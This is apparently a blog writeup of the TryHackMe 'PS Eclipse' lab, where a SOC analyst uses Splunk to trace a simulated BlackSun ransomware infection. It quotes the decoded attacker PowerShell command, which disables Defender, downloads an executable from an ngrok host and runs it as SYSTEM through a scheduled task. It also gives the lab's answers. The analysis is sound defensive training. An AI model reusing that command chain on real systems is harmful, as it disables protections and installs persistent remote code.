---
layout: post
title: 'PS Eclipse TryHackMe Writeup'
date: 2025-07-08 17:37:24 +0000
categories: [cybersecurity]
tags:
  - tryhackme
  - writeup
description: "Use Splunk to investigate the ransomware activity."
canonical_url: "https://medium.com/@hemanthakrishnach/ps-eclipse-tryhackme-writeup-ba770b3945db"
image: "/assets/images/posts/ps-eclipse-tryhackme-writeup/img-000-b7b702f4.png"
---

Use Splunk to investigate the ransomware activity.

---

Use Splunk to investigate the ransomware activity.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-000-b7b702f4.png)

Room: <https://tryhackme.com/room/posheclipse>![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-001-b3a346b0.png)

### **Scenario**

You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called **TryNotHackMe**.

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan’s machine on **Monday, May 16th, 2022**. The client noted that **the machine** is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan’s device.

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan’s device.

Happy Hunting!

### Initial Log Review

**Date Set:** March 16, 2022\
**Event Count:** 4,921

### A suspicious binary was downloaded to the endpoint. What was the name of the binary?

Let’s check the network connections since the binary is downloaded. Let’s search for the destination ports. I’ve selected some fields like destination ports, destination IP, etc.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-002-172e65a7.png)

Most of the traffic is from port 443-https. Let’s check it out. We get 296 events. Most of the connections were from the file *OUTSTANDING\_GUTTER.exe* in the temp folder. This is suspicious. This may be our downloaded file.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-003-7c74dc39.png)

Let’s continue our investigation and check port 80. I only found one image — PowerShell, let’s look into it.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-004-8f9402a6.png)

Searching for PowerShell in all events:
```markdown
* powershell
```

If we look at the command line, one command stands out and looks like it is encoded. Let’s decode it in the CyberChef — <https://gchq.github.io/CyberChef/>![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-005-b61b72e8.png)

### Command:

```sql
Set-MpPreference -DisableRealtimeMonitoring $true;wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe;SCHTASKS /Create /TN “OUTSTANDING_GUTTER.exe” /TR “C:\Windows\Temp\COUTSTANDING_GUTTER.exe” /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU “SYSTEM” /f;SCHTASKS /Run /TN “OUTSTANDING_GUTTER.exe”
```

### Command Breakdown:

- `Set-MpPreference -DisableRealtimeMonitoring $true`\
   Disables Windows Defender to avoid detection.- `wget http://.../OUTSTANDING_GUTTER.exe -OutFile C:\Windows\Temp\OUTSTANDING_GUTTER.exe`\
     Downloads a suspicious executable from an external server.- `SCHTASKS /Create ...`\
       Creates a scheduled task that runs with **SYSTEM** privileges on **Event ID 777**.\
       Uses a potentially fake or mistyped path (`COUTSTANDING_GUTTER.exe`).- `SCHTASKS /Run ...`\
         Immediately runs the scheduled task.

So, our required downloaded file is `OUTSTANDING_GUTTER.exe.`

### What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.

From the command, the address is [http://886e-181-215-214-32.ngrok.io](http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe). Let’s defang it.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-006-d2abb11e.png)

This is our defanged URL: hxxp[://]886e-181–215–214–32[.]ngrok[.]io

### What Windows executable was used to download the suspicious binary? Enter full path.

We know that the file is downloaded using PowerShell, so the full path of PowerShell is :
```makefile
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

### What command was executed to configure the suspicious binary to run with elevated privileges?

To find this out, let’s search for the `OUTSTANDING_GUTTER.exe and schtasks(used to schedule tasks in Windows).`
```typescript
OUTSTANDING_GUTTER.exe schtasks
```

We have six events and 2 Commands. The first command:
```sql
“C:\Windows\system32\schtasks.exe” /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
```

This command:

- **Creates a scheduled task** named `OUTSTANDING_GUTTER.exe`.- **Triggers on Event ID 777** from the **Application** log.- Runs the executable: `C:\Windows\Temp\COUTSTANDING_GUTTER.exe`.- Runs as **SYSTEM** (full privileges).- **Force-creates** the task (`/f`) even if one with the same name exists.

This is our required command.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-007-b9bee7ed.png)

### What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? **(Format: User + ; + CommandLine)**

We know this from the base64 encode command. The binary has SYSTEM permissions, and the command to run it is also in the command.
```sql
NT AUTHORITY\SYSTEM;”C:\Windows\system32\schtasks.exe” /Run /TN OUTSTANDING_GUTTER.exe
```

### The suspicious binary connected to a remote server. What address did it connect to? Add **http://** to your answer & defang the URL.

For this, I searched for OUTSTANDING\_GUTTER.exe and checked the DNS queries. There were five queries.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-008-10ff743e.png)

All 5 queries were made to 9030–181–215–214–32.ngrok.io![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-009-ef7dd4dd.png)

Defang it using cyberchef: hxxp[://]9030–181–215–214–32[.]ngrok[.]io![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-010-4c4ed7fc.png)

### A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?

We already know the location of the binary — in the temp folder. We need to search for a PowerShell script with a .ps1 extension. So, we’ll search:
```makefile
C:\\Windows\\Temp\\*.ps1
```

I found 5 PowerShell scripts![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-011-670b2161.png)

Investigating script.ps1, we see that it was downloaded from PowerShell; this is our required script.ps1![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-012-458aaa8c.png)

### The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?

Select one of those events and get the hash from the event details.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-013-e23a050c.png)

By checking the hash in Virustotal, we get the real name of the malware — BlackSun.ps1![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-014-3bccfd40.png)

### A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?

Ransom notes from attackers are generally text files in .txt format. So, I searched for .txt and got two hits. BlackSun\_README.txt is the ransom note.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-015-85bc1e73.png)

### The script saved an image file to disk to replace the user’s desktop wallpaper, which can also serve as an IOC. What is the full path of the image?

I searched Blacksun and looked at all the files with that name. Then, I found the image file in the pictures directory.![image](/assets/images/posts/ps-eclipse-tryhackme-writeup/img-016-65b61f34.png)

### **Conclusion**

The investigation confirmed a **BlackSun ransomware** infection on Keegan’s machine. A malicious PowerShell script disabled Defender, downloaded OUTSTANDING\_GUTTER.exe, and escalated it to **SYSTEM privileges** via a scheduled task. The malware connected to a remote ngrok server, dropped a ransom note, and changed the desktop wallpaper.

### **Thank you for reading my write-up. I hope you found it helpful.**
